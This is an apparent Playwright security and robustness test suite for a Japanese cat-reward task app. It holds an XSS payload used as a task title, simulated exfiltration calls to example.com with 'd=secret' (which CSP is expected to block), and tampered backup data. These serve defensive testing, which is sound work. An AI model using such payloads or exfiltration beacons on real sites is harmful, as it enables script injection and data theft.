import { expect, test, type Page } from "@playwright/test";

async function start(page: Page, name = "たま") {
  await page.goto("/");
  await page.locator('input[name="catName"]').fill(name);
  await page.getByRole("button", { name: "いっしょに はじめる" }).click();
  await expect(page.getByTestId("cat-name")).toHaveText(name);
}

async function addTask(page: Page, title: string, difficulty: "easy" | "normal" | "hard" = "normal") {
  await page.getByRole("button", { name: /追加/ }).first().click();
  const dialog = page.getByRole("dialog");
  await dialog.locator('input[name="title"]').fill(title);
  await dialog.locator(`.choice__item:has(input[value="${difficulty}"])`).click();
  await dialog.getByRole("button", { name: "追加する" }).click();
  await expect(dialog).toBeHidden();
}

const nav = (page: Page, label: string) => page.getByRole("navigation").getByRole("link", { name: new RegExp(label) });

test("セキュリティヘッダーが付いている", async ({ request }) => {
  const res = await request.get("/");
  const h = res.headers();
  expect(h["content-security-policy"]).toContain("default-src 'self'");
  expect(h["content-security-policy"]).toContain("frame-ancestors 'none'");
  expect(h["content-security-policy"]).toContain("object-src 'none'");
  expect(h["x-content-type-options"]).toBe("nosniff");
  expect(h["x-frame-options"]).toBe("DENY");
  expect(h["referrer-policy"]).toBe("no-referrer");
  expect(h["x-powered-by"]).toBeUndefined();
});

test("CSP に違反せずに主要な画面が動く", async ({ page }) => {
  const violations: string[] = [];
  page.on("console", (m) => {
    if (m.type() === "error") violations.push(m.text());
  });
  page.on("pageerror", (e) => violations.push(String(e)));
  await start(page);
  await addTask(page, "CSPの確認");
  await page.getByRole("button", { name: "「CSPの確認」を完了にする" }).click();
  await page.getByTestId("feed-kibble").click();
  for (const label of ["タスク", "きろく", "せってい", "ホーム"]) {
    await nav(page, label).click();
    await expect(page.locator("main .card").first()).toBeVisible();
  }
  await expect(page.locator(".cat__photo").first()).toBeVisible();
  expect(violations, violations.join("\n")).toEqual([]);
});

test("タスク名に HTML を入れても実行されず、文字として表示される", async ({ page }) => {
  await start(page);
  const payload = `<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>`;
  await addTask(page, payload.slice(0, 60));
  await expect(page.getByText(payload.slice(0, 60))).toBeVisible();
  expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
  expect(await page.locator("main img[src='x']").count()).toBe(0);
});

test("細工したバックアップ・壊れたファイル・大きすぎるファイルを拒否し、画面は固まらない", async ({ page }) => {
  await start(page);
  await nav(page, "せってい").click();
  const now = Date.now();
  const evil = {
    app: "gohobi-neko", schemaVersion: 1, exportedAt: now,
    state: { id: "main", schemaVersion: 1, onboarded: true, inventory: { kibble: 0, fish: 0, feast: 0 },
      cat: { name: "わる", xp: 1e300, fullness: 50, fullnessAt: now, petCount: 0, totalFeeds: 0, bornAt: now } },
    tasks: [], events: [],
  };
  const file = page.getByTestId("import-file");
  const status = page.getByRole("status");

  await file.setInputFiles({ name: "evil.json", mimeType: "application/json", buffer: Buffer.from(JSON.stringify(evil)) });
  await expect(status).toContainText("バックアップを読み込めません");

  await file.setInputFiles({ name: "broken.json", mimeType: "application/json", buffer: Buffer.from("{ not json") });
  await expect(status).toContainText("読み込めませんでした");

  await file.setInputFiles({ name: "big.json", mimeType: "application/json", buffer: Buffer.alloc(5_000_001, 0x20) });
  await expect(status).toContainText("読み込めませんでした");

  // 画面は操作できるまま、データも変わっていない
  await nav(page, "ホーム").click();
  await expect(page.getByTestId("cat-name")).toHaveText("たま");
  await expect(page.getByTestId("cat-level")).toHaveText("1");
});

test("完了ボタン・エサボタンを連打しても二重にならない", async ({ page }) => {
  await start(page);
  await addTask(page, "連打テスト", "easy");
  const done = page.getByRole("button", { name: "「連打テスト」を完了にする" });
  await done.dblclick();
  await expect(page.getByTestId("count-kibble")).toHaveText("2"); // 初期1 + 報酬1
  await page.waitForTimeout(400);
  await expect(page.getByTestId("count-kibble")).toHaveText("2");

  const feed = page.getByTestId("feed-kibble");
  await feed.click({ clickCount: 3, delay: 20 });
  await expect(page.getByTestId("count-kibble")).toHaveText("1");
  await page.waitForTimeout(2200);
  await expect(page.getByTestId("count-kibble")).toHaveText("1");
  await expect(page.getByTestId("xp-value")).toHaveText("10 / 20 XP");
});

test("別のタブでの変更が、もう一方のタブにも反映される", async ({ page, context }) => {
  await start(page);
  const other = await context.newPage();
  await other.goto("/");
  await expect(other.getByTestId("count-kibble")).toHaveText("1");

  await page.getByTestId("feed-kibble").click();
  await expect(page.getByTestId("count-kibble")).toHaveText("0");
  await expect(other.getByTestId("count-kibble")).toHaveText("0");
  await expect(other.getByTestId("feed-kibble")).toBeDisabled();

  await addTask(other, "別タブで追加");
  await nav(page, "タスク").click();
  await expect(page.getByText("別タブで追加")).toBeVisible();
});

test("IndexedDB が使えない環境では、説明つきのエラー画面を出す", async ({ page }) => {
  await page.addInitScript(() => {
    Object.defineProperty(window, "indexedDB", { value: undefined, configurable: true });
  });
  await page.goto("/");
  await expect(page.locator("main").getByRole("alert")).toContainText("データを開けませんでした");
  await expect(page.getByRole("button", { name: "もう一度ためす" })).toBeVisible();
});

test("保存データ（IndexedDB）を壊されても、全画面が表示できる", async ({ page }) => {
  const errors: string[] = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  await start(page);
  await addTask(page, "ふつうのタスク");
  await page.evaluate(
    () =>
      new Promise<void>((resolve, reject) => {
        const req = indexedDB.open("gohobi-neko");
        req.onsuccess = () => {
          const db = req.result;
          const tx = db.transaction(["state", "tasks", "events"], "readwrite");
          tx.objectStore("state").put({ id: "main", onboarded: true, cat: { name: "たま", xp: "abc", fullness: null, bornAt: "x" }, inventory: null });
          tx.objectStore("tasks").put({ id: "bad1", title: { a: 1 }, difficulty: "ultra", status: "weird", completedAt: "y" });
          tx.objectStore("tasks").put({ id: "bad2" });
          tx.objectStore("events").add({ type: "???", at: "never", stage: "dragon" });
          tx.objectStore("events").add({ type: "evolve", at: 1, level: "x" });
          tx.oncomplete = () => {
            db.close();
            resolve();
          };
          tx.onerror = () => reject(tx.error);
        };
      }),
  );
  for (const path of ["/", "/tasks", "/records", "/settings"]) {
    await page.goto(path);
    await expect(page.locator("main .card").first()).toBeVisible();
  }
  await page.goto("/tasks");
  await expect(page.getByTestId("task-item")).toHaveCount(1); // 読めないタスクは一覧に出さない
  await page.goto("/");
  await expect(page.getByTestId("cat-name")).toHaveText("たま");
  await expect(page.getByTestId("cat-level")).toHaveText("1");
  expect(errors, errors.join("\n")).toEqual([]);
});

test("使っていない画像変換の入口が閉じている", async ({ request }) => {
  const res = await request.get("/_next/image?url=%2Fcat%2Fnormal.webp&w=64&q=75");
  expect(res.status()).toBe(404);
});

test("注入に成功したと仮定しても、外部への読み込み・送信はできない", async ({ page }) => {
  await start(page);
  const r = await page.evaluate(async () => {
    const script = await new Promise<string>((ok) => {
      const s = document.createElement("script");
      s.src = "https://example.com/x.js";
      s.onload = () => ok("LOADED");
      s.onerror = () => ok("blocked");
      document.head.appendChild(s);
    });
    const send = await fetch("https://example.com/?d=1").then(() => "SENT").catch(() => "blocked");
    const img = await new Promise<string>((ok) => {
      const i = new Image();
      i.onload = () => ok("LOADED");
      i.onerror = () => ok("blocked");
      i.src = "https://example.com/p.png?d=secret";
    });
    let ev = "blocked";
    try {
      (0, eval)("1");
      ev = "RAN";
    } catch {
      /* CSP で禁止 */
    }
    return { script, send, img, ev };
  });
  expect(r).toEqual({ script: "blocked", send: "blocked", img: "blocked", ev: "blocked" });
});

test("アプリのアイコンが、ホーム画面用（iPhone・Android）とタブ用に設定されている", async ({ page, request }) => {
  await page.goto("/");
  const apple = await page.locator('link[rel="apple-touch-icon"]').getAttribute("href");
  const icon = await page.locator('link[rel="icon"]').first().getAttribute("href");
  expect(apple).toMatch(/^\/apple-icon\.png/);
  expect(icon).toMatch(/^\/icon\.png/);
  await expect(page.locator('meta[name="mobile-web-app-capable"]')).toHaveAttribute("content", "yes");
  const manifest = await (await request.get("/manifest.webmanifest")).json();
  expect(manifest.display).toBe("standalone");
  expect(manifest.icons.map((i: { purpose: string }) => i.purpose)).toEqual(["any", "any", "maskable"]);
  for (const src of [apple!, icon!, ...manifest.icons.map((i: { src: string }) => i.src)]) {
    const res = await request.get(src);
    expect(res.status(), src).toBe(200);
    expect(res.headers()["content-type"]).toBe("image/png");
  }
});
